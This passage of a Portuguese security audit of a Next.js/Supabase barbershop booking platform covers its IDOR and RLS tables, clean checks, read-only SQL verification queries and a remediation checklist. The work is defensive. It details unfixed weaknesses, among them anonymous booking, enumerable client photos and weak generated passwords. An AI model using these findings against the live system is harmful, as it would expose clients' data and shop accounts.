| `marcarFalta` | `appointmentId` | `mark_no_show` exige `has_shop_access` (`02:915`) | **OK** |
| `concluirEmLote` | `itens[].id` | `complete_appointments_lote` confere `has_shop_access` **por item** (`18:132`) | **OK** |
| `reverterStatus` | `appointmentId` | `reverter_status_agendamento` exige `has_shop_access` (`16:387`) | **OK** |
| `agendar` | `shopId`, `professionalId`, `serviceIds[]`, `dependentId` | `book_appointment` valida tudo contra `p_shop`; dependente conferido contra `v_profile` (`13:356-362`) | **OK** — mas ver BUG-010 (roda sem sessão) |
| `avaliarAtendimento` | `appointmentId` | Lê o agendamento pela RLS (só o próprio ou o da loja) e a policy `reviews_insert` reconfere | **OK** |
| `registrarVisita` · `alternarFavorito` · `removerAcessoRecente` | `barbershopId` | Escreve sempre com `profile_id` do próprio; FK garante a loja | **OK** |
| `salvarDependente` · `removerDependente` · `sairDaEspera` · `marcarNotificacaoLida` | `id` do recurso | Filtro duplo `.eq("id", …).eq("profile_id", perfil.id)` | **OK** |
| `salvarCliente` · `salvarObservacoes` | `customerId` | Filtro duplo `.eq("id", …).eq("barbershop_id", shopId)` | **OK** |
| `apagarLancamento` | `id` da transação | `.eq(shopId)` + `.eq(type,"expense")` + `.is(appointment_id,null)` | **OK** |
| `pagarComissao` | `professionalId` | `pay_commissions` deriva a loja **do profissional** e exige `can_manage_money` (`08:328`) | **OK** |
| `estornarPagamentoComissao` | `pagamentoId` | `revert_commission_payment` deriva a loja do pagamento e exige `can_manage_money` (`08:487`) | **OK** |
| `receberFiado` | `debtId` | `pay_debt` deriva a loja da dívida e exige `has_shop_access` (`02:965`) | **OK** |
| `responderAvaliacao` | `reviewId` | `.eq("id", …).eq("barbershop_id", shopId)` | **OK** na action — ver **SEC-010** para a policy |
| `removerDaEspera` · `marcarEsperaConvertida` | `id` da entrada | `.eq("id", …).eq("barbershop_id", shopId)` | **OK** |
| `salvarProfissional` | `id`, **`profileId`** | `.eq(shopId)` + trigger `professionals_guard_profile` para o `profileId` (`15:111-152`) | **OK** |
| `salvarJornada` | `professionalId` | Confere que o profissional é da loja antes de escrever (`team.ts:158-166`) | **OK** |
| `removerFolga` | `id` | `.eq("id", …).eq("barbershop_id", shopId)` | **OK** |
| `removerAssistente` | `profileId` | `.eq(id)` + `.eq(barbershop_id, shopId)` + `.eq(role,"assistant")`, escrito à mão porque a service role ignora RLS | **OK** |
| `salvarBeneficios` | `ids[]` | Interseção com o catálogo ativo antes de gravar (`shop.ts:230-231`) | **OK** |
| `salvarServico` · `alternarServico` | `id` do serviço | `requireOwnerContext()` + filtro duplo `.eq("id", …).eq("barbershop_id", shopId)` (`services.ts:53-54,110-111`) | **OK** |
| `moverServico` | `id` do serviço | Os dois ids saem de uma lista **já filtrada** por `shopId` (`services.ts:138`), e a RLS `services_write` exige `can_manage_money`. Os dois `update` finais não repetem o filtro de loja (`services.ts:153-154`) — defesa em profundidade ausente, sem consequência de acesso | **OK** — ver BUG-023 (atomicidade) |
| `entrarNaEspera` | `shopId`, `professionalId`, `serviceId` | `join_waitlist` valida **só** sessão, loja não-nula e período | ⚠️ **SEC-016** |
| `buscarPorToken` · `cancelarPorToken` | `token` | O token **é** a credencial; expira 1h após o fim (`20:88-97`) | **OK** — ver BUG-009 (formato) |

**Resultado: 26 de 27 fecham.** O padrão que se repete e que sustenta o resultado é consistente: **o identificador do tenant nunca vem do payload** — vem de `requireShopContext()`/`requireOwnerContext()`, que o derivam de `auth.uid()`; e quando o id de um recurso vem do chamador, ou há filtro duplo na consulta, ou a função do Postgres deriva a loja **do próprio recurso** e confere a permissão contra ela. As duas técnicas são equivalentes e ambas são corretas.

A única exceção é `join_waitlist` (**SEC-016**), e ela não vaza dado — permite escrever lixo.

**Conclusão sobre IDOR, dita com a confiança que a evidência permite:** não encontrei nenhum caminho de acesso a recurso de outro tenant por troca de identificador. Isso vale para as 27 actions acima, verificadas por leitura. **Não foi testado em execução** — nenhuma requisição foi feita. Uma suíte que exercite estas 27 linhas com três sessões reais (dono A, assistente A, cliente) é o que transformaria esta tabela de "não encontrei" em "está provado".

---

# Fase 2 — o que foi verificado e voltou limpo

Registrado porque, numa auditoria, a ausência confirmada vale tanto quanto o achado.

| Item | Verificação | Resultado |
|---|---|---|
| **CSRF** | `next.config.ts` não tem bloco `experimental`, portanto `serverActions.allowedOrigins` está no padrão: o Next 15 compara `Origin` com `Host` e recusa Server Action de outra origem. Somado a `sameSite: "lax"` no cookie | **OK.** ⚠️ Depende de ninguém acrescentar `allowedOrigins` depois — se acrescentar, a proteção é justamente essa que cai |
| **Injeção SQL** | Nenhum SQL concatenado em lugar nenhum; toda função do banco usa parâmetros tipados. Único filtro montado por string é o `.or()` de `customers.ts:66`, sanitizado **e** recortado por um `.eq("barbershop_id")` separado | **OK** (ver BUG-014 — robustez, não vulnerabilidade) |
| **XSS por `dangerouslySetInnerHTML`** | Duas ocorrências, ambas de constante do código: script de tema (`layout.tsx:89`) e JSON-LD estático (`page.tsx:236`). Nenhum dado de usuário | **OK** |
| **Open redirect** | `destinoSeguro()` (`auth.ts:68-72`) recusa o que não começa com `/` e recusa `//`; a Route Handler de callback repete a checagem (`callback/route.ts:68`) | **OK** |
| **Upload — path traversal** | `pode_escrever_imagem()` rejeita caminho com número de segmentos ≠ 3 (`14:111`), o que fecha `clientes/<outro>/../meu/foto.webp`, e faz cast de uuid dentro de `begin/exception` para o caminho inválido virar recusa limpa | **OK** |
| **Upload — tipo e tamanho** | Limite de 5 MB e MIME restrito a JPEG/PNG/WebP declarados **no bucket** (`14:64-75`), não só na tela — quem chamar a API do Storage direto esbarra neles | **OK** |
| **Webhooks** | Nenhum endpoint de recebimento existe neste sistema. A exigência de assinatura/idempotência não se aplica | **N/A** |
| **CORS** | A aplicação Next não define CORS; o que importa é o do PostgREST do Supabase, configurado no painel | **NÃO VERIFICADO** — está no checklist |
| **Auto-promoção de papel** | `handle_new_user()` força `role = 'client'` ignorando o metadata (`02:45`); `revoke update on profiles` + `grant update (6 colunas)` impede `PATCH {"role":"owner"}` (`03:529-531`). Mesma técnica em `barbershops` para `owner_id` e `rating_*` | **OK** — é uma das partes mais bem-feitas do sistema |
| **Service role no cliente** | `src/lib/supabase/admin.ts:1` abre com `import "server-only"`, que quebra o build se um `"use client"` a importar. Os 5 usos foram lidos: todos confirmam o papel antes de instanciar | **OK** |
| **Segredos versionados** | `.gitignore:7-9` cobre `.env*`; `.env.example` só tem nomes e comentários. Nenhum segredo encontrado no repositório | **OK** (exceto SEC-012, que é telefone comercial, não segredo) |
| **Idempotência de dinheiro** | `commission_payments.idempotency_key` com índice único, chave gerada por `crypto.randomUUID()` no formulário e travada por `pg_advisory_xact_lock` por profissional (`08:342-353`) | **OK** — bem-feito |

---

# Tabela de RLS — uma linha por tabela

Estado **conforme o SQL do repositório**. Não foi verificado contra o banco real (ver "Verificações obrigatórias no banco real").

Legenda do veredito: **OK** = a política corresponde à intenção e não encontrei brecha · **FRACA** = a política existe mas o `grant` ou a policy expõe mais do que deveria · **AUSENTE** = sem RLS ou sem policy onde deveria haver.

| # | Tabela | RLS? | Policies existentes | Acesso de `anon` | Veredito | Risco |
|---|---|---|---|---|---|---|
| 1 | `profiles` | ✅ `03_rls.sql:19` | `profiles_select` (próprio ∨ `has_shop_access` ∨ admin), `profiles_update` (próprio ∨ admin). Sem policy de insert — feito pelo trigger `handle_new_user()` | nenhum grant | **OK** | `revoke update` + `grant update (6 colunas)` em `:529-531` fecha a auto-promoção a `owner`. Ponto forte. Mas `email` é editável pelo usuário e é usado como prova de identidade em `trocarSenha` → **BUG-005** |
| 2 | `user_addresses` | ✅ `:20` | `user_addresses_all` (`profile_id = auth.uid()`) | nenhum | **OK** | — |
| 3 | `dependents` | ✅ `:21` | `dependents_all` (`profile_id = auth.uid()`) | nenhum | **OK** | `book_appointment` confere adicionalmente que o dependente é de quem agenda (`13_agendamento_avulso.sql:356-362`) |
| 4 | `barbershops` | ✅ `:22` | `_public_select` (anon, `is_active`), `_select`, `_update` (`can_manage_money`), `_insert`/`_delete` (`is_platform_admin`) | `select` **tabela inteira** `:518` | **FRACA** | `owner_id` público → **SEC-009**. Escrita bem protegida por grant de coluna (`:535-542`) |
| 5 | `business_hours` | ✅ `:23` | `_public_select` (anon), `_select`, `_write` (`can_manage_money`) | `select` tabela inteira | **OK** | Todas as colunas são públicas por natureza (dia, abre, fecha, almoço) |
| 6 | `professionals` | ✅ `:24` | `_public_select` (anon, ativo + loja ativa), `_select`, `_write` (`can_manage_money`) | `select` **tabela inteira** | **FRACA** | `commission_percent` e `profile_id` públicos → **SEC-003 (ALTO)**. Também serializados no bundle de `/b/[slug]/agendar` |
| 7 | `professional_schedules` | ✅ `:25` | `_select` (`has_shop_access` via `professionals`), `_write` (`can_manage_money`) | nenhum | **OK** | — |
| 8 | `time_off` | ✅ `:26` | `_select` (`has_shop_access`), `_write` (`can_manage_money`) | nenhum | **OK** | — |
| 9 | `services` | ✅ `:27` | `_public_select` (anon, ativo + loja ativa), `_select`, `_write` (`can_manage_money`) | `select` tabela inteira | **OK** | Nome, preço e duração são públicos por desenho — é o cardápio |
| 10 | `customers` | ✅ `:28` | `_select` (`has_shop_access`), `_write` (`has_shop_access`) | nenhum | **FRACA** | **SEC-013 (ALTO)** — a tabela é classificada como operacional, mas guarda `total_spent`, que é receita acumulada por cliente. Com `has_shop_access`, o **assistente** lê a coluna e, somando, obtém o faturamento histórico da loja — contrariando a regra que `:446-451` declara. Mesmo limite que o projeto já reconhece em `:239-241`: **a RLS filtra linha, não coluna**. Do lado bom, e é uma decisão de destaque: o **cliente** não lê a própria ficha, justamente para não ler `notes` junto |
| 11 | `favorites` | ✅ `:29` | `favorites_all` (`profile_id = auth.uid()`) | nenhum | **OK** | — |
| 12 | `shop_visits` | ✅ `:30` | `shop_visits_all` (`profile_id = auth.uid()`) | nenhum | **OK** | Sem limite de escrita → **SEC-008** |
| 13 | `appointments` | ✅ `:31` | `_select` (`has_shop_access` ∨ `owns_customer` ∨ `created_by = auth.uid()`), `_insert`/`_update`/`_delete` (`has_shop_access`) | nenhum | **OK** | A terceira condição de select foi acrescentada por `19_agendamento_de_quem_criou.sql:85-91`, com a justificativa de segurança nas linhas 42-49 — `created_by` não é escolhido pelo chamador. Raciocínio verificado e correto |
| 14 | `appointment_services` | ✅ `:32` | `_select` (segue o agendamento, incl. `created_by`), `_write` (`has_shop_access`) | nenhum | **OK** | — |
| 15 | `waitlist_entries` | ✅ `:33` | `_select`/`_insert`/`_update`/`_delete` (`has_shop_access` ∨ `profile_id = auth.uid()`) | nenhum | **OK** | Cliente pode entrar na fila de qualquer loja — comportamento desejado |
| 16 | `reviews` | ✅ `:34` | `_public_select` (anon, loja ativa), `_select`, `_insert` (autor + atendimento concluído), `_update` (autor ∨ `has_shop_access`) + trigger `reviews_guard_reply` | `select` **tabela inteira** | **FRACA** | `profile_id` e `appointment_id` públicos → **SEC-004**. `_update` permissiva demais para `reply` → **SEC-010**. O grant é redundante: a aplicação lê por `public_reviews()`, que já recorta |
| 17 | `transactions` | ✅ `:35` | `transactions_all` (`can_manage_money`) | nenhum | **OK** | Assistente não lê faturamento nem chamando a API. Confirmado |
| 18 | `commissions` | ✅ `:36` | `commissions_all` (`can_manage_money`) | nenhum | **OK** | Exceção controlada: `comissoes_do_dia()` é `security definer` e devolve **só a linha do próprio** ao assistente ligado a um profissional (`15_comissao_do_dia.sql:246`), com portão de migração contra regressão (`:290-292`) |
| 19 | `debts` | ✅ `:37` | `_select` (`has_shop_access` ∨ `owns_customer`), `_write` (`has_shop_access`) | nenhum | **OK** | Fiado é operacional de propósito — o assistente cobra no balcão (`:466-471`) |
| 20 | `debt_payments` | ✅ `:38` | `_select` (via `debts`), `_write` (via `debts` + `has_shop_access`) | nenhum | **OK** | — |
| 21 | `notifications` | ✅ `:39` | `_select`/`_update`/`_delete` (`profile_id = auth.uid()`). Sem policy de insert — criadas pelas funções `security definer` | nenhum | **OK** | — |
| 22 | `amenities` | ✅ `09_beneficios.sql:135` | `_public_select` (anon + authenticated, `is_active`). **Sem policy de escrita, deliberadamente** | `revoke all` + `grant select` `:187,189` | **OK** | Catálogo fechado: só migration altera. `revoke all from authenticated` + `grant select` (`:195-196`) impede até o admin escrever pela API |
| 23 | `barbershop_amenities` | ✅ `09:136` | `_public_select` (anon), `_select`, `_write` (`can_manage_money`) | `revoke all` + `grant select` `:188,190` | **OK** | Portão de migração confere que `anon` não ficou com escrita (`:224-234`) |
| 24 | `commission_payments` | ✅ `08_comissao_parcial.sql:186` | `_all` (`can_manage_money`) | `revoke all` `:194` | **OK** | O comentário `:188-193` documenta a armadilha do `ALTER DEFAULT PRIVILEGES` do Supabase, que concede tudo a `anon` em tabela nova. Tratada corretamente |
| 25 | `walk_in_counters` | ✅ `13_agendamento_avulso.sql:161` | `_select` (`has_shop_access`). **Sem policy de escrita** — só a função `security definer` incrementa | nenhum | **OK** | `grant select` explícito a `authenticated` (`:178`), com o motivo comentado |
| 26 | `public_booking_attempts` | ✅ `17_agendamento_publico.sql:157` | **Zero policies, deliberadamente** | `revoke all` de anon **e** authenticated `:165` | **OK** | RLS ligada sem policy = nega tudo. Só a função `security definer` escreve. O comentário `:159-164` explica: *"Um log de segurança que o público consegue ler é um mapa do próprio limite"* |
| — | `storage.objects` (bucket `imagens`) | ✅ (nativa do Supabase) | `imagens_leitura` (**anon + authenticated, sem recorte de caminho**), `imagens_insert`/`_update`/`_delete` (via `pode_escrever_imagem()`) | leitura **e listagem** de todo o bucket | **FRACA** | **SEC-002 (ALTO)** — a policy de select governa também a API de listagem, permitindo enumerar `clientes/{profile_id}/…`. A **escrita** está bem protegida, incl. contra path traversal (`14_storage_imagens.sql:111`) |

### Leitura da tabela

**26 tabelas, todas com RLS habilitada. Nenhuma policy `using (true)`. Nenhuma tabela sem policy por descuido** — as duas sem policy de escrita (`amenities`, `public_booking_attempts`) são fechadas de propósito e documentadas.

Nenhum dos pontos fracos é uma policy mal escrita. **Todos os cinco são a mesma falha estrutural, em duas variantes:**

**Variante A — o grant não acompanha a policy.** `barbershops`, `professionals` e `reviews` levam `grant select on <tabela> to anon` **sem lista de colunas** (`supabase/03_rls.sql:518`). A policy decide *quais linhas*; o grant decide *quais colunas* — e esse grant foi escrito uma única vez, para cinco tabelas, antes de `professionals.profile_id` sequer existir. Corrigir esse único ponto resolve **SEC-003, SEC-004 e SEC-009** de uma vez. `storage.objects` é a mesma ideia noutra sintaxe: uma condição sem recorte (`bucket_id = 'imagens'`) governando mais do que se pretendia (**SEC-002**).

**Variante B — a RLS não sabe recortar coluna.** `customers` tem a policy certa para o acesso que a equipe precisa e, na mesma linha, uma coluna (`total_spent`) que não deveria alcançar o assistente (**SEC-013**). Aqui não há grant a ajustar em `anon` — o problema é que a granularidade da RLS termina na linha, e uma tabela operacional acabou guardando um dado financeiro. **A mesma limitação, com o sinal invertido, é o que o projeto usa como argumento em `:236-245` para não deixar o cliente ler a própria ficha.** O raciocínio estava certo; só não foi aplicado na direção do assistente.

---

# Riscos estruturais

## RE-1 — Não há controle de versão de migrations, e isso invalida a certeza de todo achado de banco

As 20 migrations são numeradas e aplicadas manualmente (SQL Editor ou `supabase/aplicar-sql.mjs`). **Não existe tabela registrando o que já rodou.**

O projeto compensa com "portões" no fim de cada arquivo — blocos `do $$` que levantam exceção se o resultado esperado não estiver no banco. Alguns verificam **regressões de migrations anteriores**, o que é uma prática acima da média (o melhor exemplo é `supabase/19_agendamento_de_quem_criou.sql:397-415`, que faz a migração 19 falhar se a trava C-2 da migração 11 tiver sumido). Mas o portão responde *"o estado final está certo?"*, não *"o que já rodou aqui?"*.

**Consequência direta para este relatório:** se `13_agendamento_avulso.sql` nunca rodou em produção, `book_appointment` lá é a versão da migração 11 e o SEC-001 tem outro contorno. Se `03_rls.sql` foi reaplicado depois do `09_beneficios.sql`, o `revoke all on all tables in schema public from anon` da linha 517 teria removido os grants que o arquivo 09 concedeu, quebrando o perfil público — ou o inverso. **Nada disso é verificável sem consultar o banco.**

## RE-2 — A ordem de aplicação de `03_rls.sql` é frágil por construção

`supabase/03_rls.sql:517,521` usa `on all tables in schema public`, que atua sobre as tabelas **existentes naquele instante**. As migrations posteriores sabem disso e compensam à mão — `08:194`, `09:187-196`, `13:178`, `17:165` todas reconcedem ou revogam explicitamente, com comentários alertando sobre a "armadilha nº 17" (o `ALTER DEFAULT PRIVILEGES` do Supabase que concede tudo a `anon` em tabela nova).

O tratamento é correto **em cada caso**, mas depende de a próxima pessoa lembrar. Uma tabela nova criada sem esse cuidado nasce com privilégios de `anon` herdados do default do Supabase. O caso do `professionals.profile_id` (SEC-003) mostra que a mesma armadilha se aplica a **colunas** novas, e essa variante não tem nenhum aviso no repositório.

**Direção:** um portão único, rodado ao fim de qualquer migration, que liste todo privilégio de `anon` no schema `public` e falhe se algo estiver fora de uma lista explícita de permitidos.

## RE-3 — Zero cobertura de teste sobre RLS e sobre a lógica financeira

Não há nenhum arquivo de teste no repositório, nem script de teste em `package.json:5-11`. As garantias de isolamento multi-tenant — que são o núcleo do produto — dependem inteiramente de leitura de código.

`supabase/08_comissao_parcial.sql:150-155` registra um bug que só apareceu *"exercitando a RPC de verdade — ler o SQL não mostraria"*. É a evidência, escrita pelo próprio projeto, de que a leitura não basta.

**Direção mínima:** um conjunto de testes que, com três sessões (dono da loja A, assistente da loja A, cliente qualquer), tente ler e escrever cada tabela e afirme o resultado esperado. É a suíte que teria pego SEC-003 e SEC-004 no dia em que foram introduzidos.

---

# Verificações obrigatórias no banco real

Rodar **antes** de agir sobre qualquer achado. Nada abaixo altera dados.

```sql
-- 1. SEC-001 — quem pode executar book_appointment?
select p.proname, r.rolname, has_function_privilege(r.rolname, p.oid, 'EXECUTE') as pode
  from pg_proc p
  join pg_namespace n on n.oid = p.pronamespace,
       (values ('anon'),('authenticated'),('service_role')) as r(rolname)
 where n.nspname = 'public' and p.proname like 'book_appointment%'
 order by 1, 2;
-- ESPERADO após a correção: book_appointment          → anon = false, authenticated = true
--                            book_appointment_publico  → anon = false, authenticated = false, service_role = true

-- 2. SEC-003/004/009 — quais colunas anon enxerga?
select table_name, column_name, privilege_type
  from information_schema.column_privileges
 where table_schema = 'public' and grantee = 'anon'
 order by table_name, column_name;
-- PROCURAR: professionals.commission_percent, professionals.profile_id,
--           reviews.profile_id, reviews.appointment_id, barbershops.owner_id

-- 3. Panorama de RLS — nenhuma tabela pode aparecer com rowsecurity = false
select t.tablename, t.rowsecurity, count(p.policyname) as policies
  from pg_tables t
  left join pg_policies p on p.schemaname = t.schemaname and p.tablename = t.tablename
 where t.schemaname = 'public'
 group by 1, 2 order by 2, 1;
-- ATENÇÃO: policies = 0 só é aceitável em public_booking_attempts (fechada de propósito)

-- 4. Nenhuma policy permissiva demais
select tablename, policyname, roles, cmd, qual, with_check
  from pg_policies
 where schemaname = 'public' and (qual = 'true' or with_check = 'true');
-- ESPERADO: zero linhas

-- 5. SEC-002 — a policy do Storage
select policyname, roles, cmd, qual, with_check
  from pg_policies
 where schemaname = 'storage' and tablename = 'objects';
select id, public, file_size_limit, allowed_mime_types from storage.buckets;

-- 6. Nenhuma função escapou do revoke de PUBLIC
select p.proname, pg_get_function_identity_arguments(p.oid) as args
  from pg_proc p join pg_namespace n on n.oid = p.pronamespace
 where n.nspname = 'public' and has_function_privilege('public', p.oid, 'EXECUTE')
 order by 1;
-- ESPERADO: zero linhas (03_rls.sql:558 revoga; migrations posteriores repetem)

-- 7. Funções security definer sem search_path fixo (vetor de sequestro de schema)
select p.proname, p.prosecdef, p.proconfig
  from pg_proc p join pg_namespace n on n.oid = p.pronamespace
 where n.nspname = 'public' and p.prosecdef and p.proconfig is null;
-- ESPERADO: zero linhas — todas as funções do repositório declaram `set search_path`

-- 8. Volume, para dimensionar BUG-002/003/004 de AUDITORIA_BUGS.md
select 'transactions' t, count(*) from transactions
union all select 'appointments', count(*) from appointments
union all select 'appointment_services', count(*) from appointment_services
union all select 'commissions (não pagas)', count(*) from commissions where status <> 'paid';
```

E no painel do Supabase, sem SQL:

- **Project Settings → API →** valor de `db-max-rows` (afeta BUG-002/003/004 de `AUDITORIA_BUGS.md`).
- **Authentication → Rate Limits →** valores efetivos de login e de cadastro (SEC-008).
- **Authentication → Policies →** tamanho mínimo de senha e verificação contra vazamentos (SEC-011).
- **Authentication → URL Configuration →** as Redirect URLs permitidas devem listar **apenas** os domínios de produção e de desenvolvimento. Um curinga aqui é um vetor de sequestro de sessão via OAuth que este repositório não teria como impedir.
- **Storage → `imagens` →** confirmar `public = true` e conferir se há objetos sob `clientes/` (SEC-002).

---

# Checklist pré-produção

Ordenado por bloqueio. Nada abaixo depende de código ainda não escrito.

## 🔴 Bloqueia o deploy

- [ ] **SEC-001 — revogar `execute` de `book_appointment` para `anon`.** Correção de uma linha. Sem ela, toda barbearia da plataforma aceita agendamento anônimo em qualquer horário, sem limite de taxa, independentemente da configuração dela. Acrescentar o portão de migração que impede a regressão.
- [ ] **SEC-002 — fechar a listagem do bucket `imagens` para `anon`,** ou mover `clientes/` para um bucket privado. Enquanto estiver assim, as fotos de rosto de todos os clientes são enumeráveis sem conta.
- [ ] **SEC-003 — trocar `grant select on professionals to anon` por grant de coluna,** removendo `commission_percent` e `profile_id`. A comissão de cada barbeiro está hoje no código-fonte de `/b/[slug]/agendar`.
- [ ] **SEC-006 + SEC-014 — remover o curinga `hostname: "**"`** de `next.config.ts:39`. É mudança só de configuração, sem tocar em dependência, e é o que retira a `sharp` 0.34.5 (quatro CVEs de libvips) do alcance de entrada não confiável vinda da internet. **Faça antes de tudo que envolva atualizar pacote** — é barato, imediato e não regride nada.
- [ ] **SEC-011 — parar de gerar senha de dono e de assistente com `Math.random()`.** Trocar por `crypto.randomBytes` no servidor e aumentar o comprimento. Hoje a conta de dono de barbearia nasce com ~31 bits de um PRNG previsível, em formato público, e nada força a troca.
- [ ] **SEC-013 — decidir e implementar o que fazer com `customers.total_spent`.** Hoje o assistente lê o quanto cada cliente gastou e, somando, o faturamento histórico da loja — contrariando a garantia que o sistema afirma cumprir. Se a decisão for "pode ver", corrigir a documentação em vez do código.
- [ ] **Rodar as consultas da seção "Verificações obrigatórias no banco real"** e confirmar que o banco de produção corresponde ao SQL do repositório. Sem isso, nenhuma das correções acima pode ser dada como aplicada.
- [ ] **Preencher `NEXT_PUBLIC_SUPORTE_EMAIL` e `NEXT_PUBLIC_SUPORTE_TELEFONE`.** O próprio `.env.example:44-48` marca isto como bloqueador: com `PREENCHER_ANTES_DO_DEPLOY`, o bloco de suporte some em produção.
- [ ] **Definir `NEXT_PUBLIC_SITE_URL` no painel da Vercel.** `src/lib/env.ts:39-44` documenta a falha silenciosa: sem ela, o site sobe funcionando e anuncia `localhost` para o Google em toda tag canonical e em todo endereço do sitemap.
- [ ] **SEC-014 — resolver as 3 vulnerabilidades altas das dependências.** `npm audit --omit=dev` **já foi executado** e devolveu: `sharp` 0.34.5 (4 CVEs de libvips) e a `postcss` aninhada do Next (4 avisos). Subir `sharp` para ≥ 0.35.0 — possivelmente por `overrides`, sem subir o Next de major. **Não rodar `npm audit fix --force`**: ele instala `next@16.3.1`, que é breaking change.
- [ ] **Confirmar que `SUPABASE_SERVICE_ROLE_KEY` está apenas nas variáveis de servidor da Vercel**, nunca com prefixo `NEXT_PUBLIC_`, e não aparece em `.env` versionado. (Verificado no repositório — falta confirmar no painel.)
- [ ] **Restringir as Redirect URLs do Supabase Auth** aos domínios reais. Curinga aqui anula todo o controle de sessão.

## 🟠 Antes dos primeiros clientes pagantes

- [ ] **SEC-004 — revogar `select` de `anon` em `reviews`.** A aplicação já lê por `public_reviews()`; o grant é resíduo e não quebra nada ao sair.
- [ ] **SEC-009 — grant por coluna em `barbershops`,** removendo `owner_id`.
- [ ] **SEC-005 — acrescentar headers de segurança** em `next.config.ts`. Começar por `Referrer-Policy` (resolve o vazamento do token de `/a/[token]` numa linha), `X-Frame-Options`, `X-Content-Type-Options` e `Strict-Transport-Security`. A CSP pode subir depois, em `Report-Only`.
- [ ] **SEC-006 (continuação) — montar a lista definitiva de hosts de imagem** que substitui o curinga removido no bloco 🔴. A consulta SQL que levanta os hosts realmente em uso está no achado. Sem ela, o bloqueio do 🔴 pode quebrar imagens de lojas que usam URL externa.
- [ ] **BUG-005 (`AUDITORIA_BUGS.md`) — corrigir a troca de senha** para não pular a verificação quando `profiles.email` é nulo, e para usar o e-mail da sessão em vez do de `profiles`. É sequestro de conta com sessão comprometida.
- [ ] **SEC-008 — verificar e endurecer o limite de taxa do Supabase Auth,** e confirmar se existe fluxo de recuperação de senha (nenhum foi encontrado neste repositório). **Prioridade elevada pelo SEC-011:** enquanto as senhas provisórias tiverem ~31 bits em formato conhecido, o limite de taxa do login é a única coisa entre elas e um ataque de adivinhação.
- [ ] **SEC-007 — trocar o sal do hash de IP** por uma variável dedicada e remover o fallback `?? "pibarber"`.
- [ ] **SEC-017 — parar de registrar o objeto de erro inteiro** em `src/lib/erros.ts:49,125,134`. Os campos `details` e `hint` do Postgres carregam os valores da linha que colidiu — telefone e e-mail de cliente vão para o log da Vercel numa operação rotineira.
- [ ] **SEC-016 — validar profissional, serviço, loja ativa e faixa de data em `join_waitlist`.** Hoje dá para injetar linhas na fila de qualquer barbearia, com dados de outra.
- [ ] **SEC-018 — marcar o cookie de sessão como `Secure`** nas duas chamadas de `setAll` (`src/lib/supabase/server.ts` e `src/middleware.ts`). É a parte acionável; `httpOnly` não dá para ligar, por desenho do `@supabase/ssr`.
- [ ] **Verificar o CORS do PostgREST** no painel do Supabase — único item da Fase 2 que ficou sem verificação.
- [ ] **BUG-010 — exigir sessão em `agendar`**, para o visitante ter uma porta só.
- [ ] **BUG-002/003/004 — parar de somar dinheiro em JavaScript sobre consultas com `limit`.** O Caixa exibe hoje um total menor que o real a partir de 500 transações no período, e diverge dos Relatórios para o mesmo período.
- [ ] **BUG-018/BUG-019 — consertar as duas telas que a RLS silenciou.** `/painel/espera` não mostra o telefone de quem está na fila (a funcionalidade inteira é inoperante) e `/painel/avaliacoes` assina toda avaliação como "Cliente". Não é segurança — é funcionalidade quebrada por uma policy correta —, mas entra aqui porque **a correção errada seria afrouxar `profiles_select`**, e isso abriria telefone, e-mail e data de nascimento de toda a base para a equipe de qualquer loja.

## 🟡 Higiene, sem prazo crítico

- [ ] **SEC-010 — alinhar `reviews_update` com a intenção de produto** (`can_manage_money` em vez de `has_shop_access` para a coluna `reply`).
- [ ] **SEC-011 (continuação) — forçar a troca da senha no primeiro acesso.** Sem isso, a senha "provisória" é a senha permanente da conta, e os consertos do bloco 🔴 só melhoram o valor inicial.
- [ ] **SEC-015 — acrescentar `rel="noopener noreferrer"`** em `src/components/admin/AdminPainel.tsx:84`, a única das 18 ocorrências de `target="_blank"` que não o tem.
- [ ] **SEC-012 — trocar o número de WhatsApp real em `.env.example`** por um valor de exemplo.
- [ ] **RE-1 — adotar controle de versão de migrations** (CLI do Supabase, ou tabela `schema_migrations` escrita por `aplicar-sql.mjs`).
- [ ] **RE-2 — criar um portão único de privilégios de `anon`**, rodado ao fim de qualquer migration, que falhe diante de qualquer privilégio fora de uma lista explícita.
- [ ] **RE-3 — testes de RLS com três sessões** (dono A, assistente A, cliente), afirmando o acesso esperado tabela por tabela. **Seria a suíte que pegaria SEC-013 no dia em que `total_spent` foi criada**, e que pegaria BUG-018/019 no dia em que os embeds foram escritos.
- [ ] **Substituir os `select("*")` em contexto público** (`src/lib/queries/barbearia.ts:124,176,193,210`) por listas de coluna explícitas.
- [ ] **Varrer os demais embeds do PostgREST** procurando o padrão de RA-6 (`AUDITORIA_BUGS.md`): embed cuja policy da tabela embutida não cobre o papel de quem consulta devolve **nulo em silêncio**, e a tela mostra um valor de reserva plausível. Foram mapeados os três embeds de `profiles`; as demais tabelas não foram varridas.
- [ ] **Auditar os ~60 componentes ainda não lidos** — a lista está em "Escopo NÃO coberto".
- [ ] **Ler o `AUDITORIA.md` de rodada anterior** que já existe na raiz e reconciliar com estes achados.
- [ ] **Configurar monitoramento de erro** (Sentry ou equivalente). Hoje toda falha vai para `console.error`, que na Vercel some da retenção padrão em pouco tempo — e vários caminhos falham em silêncio de propósito (`registrarVisita`, `apagarImagemAntiga`, `carregar*` das queries), que é a decisão certa para a tela e a errada para a operação, se ninguém estiver olhando.

---

**Documento companheiro:** `AUDITORIA_BUGS.md`, na raiz do repositório — achados funcionais (IDs `BUG-XXX`), riscos arquiteturais e a lista completa do que não foi verificado.
